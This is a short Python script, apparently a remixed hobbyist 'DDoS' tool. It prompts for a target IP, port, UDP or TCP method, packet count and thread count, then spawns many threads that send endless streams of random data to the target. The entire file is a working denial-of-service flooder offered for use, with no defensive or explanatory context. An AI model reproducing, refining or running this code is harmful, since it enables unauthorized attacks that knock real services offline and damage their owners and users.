#tols by leon
#remake by JetX

import random
import socket
import threading
import time

print("""\033[1;31;40m

      	 | UDP | TCP | 
      Credit By: ShiYujiWasHere
""")

ip = str(input("\033[94m Ip target \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort Target \033[1;31;40m====> : "))
choice = str(input(" \033[94mMetods (UDP/TCP) \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPaket (50) \033[1;31;40m      ====> : "))
threads = int(input("\033[94m Threads (800) \033[1;31;40m    ====> : "))

def udp():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"attack {ip} port {port}")
		except:
			print(f"attack {ip} port {port}")

def tcp():
	data = random._urandom(102498)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"attack {ip} port {port}")
		except:
			s.close()
			print(f"attack {ip} port {port}")


for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()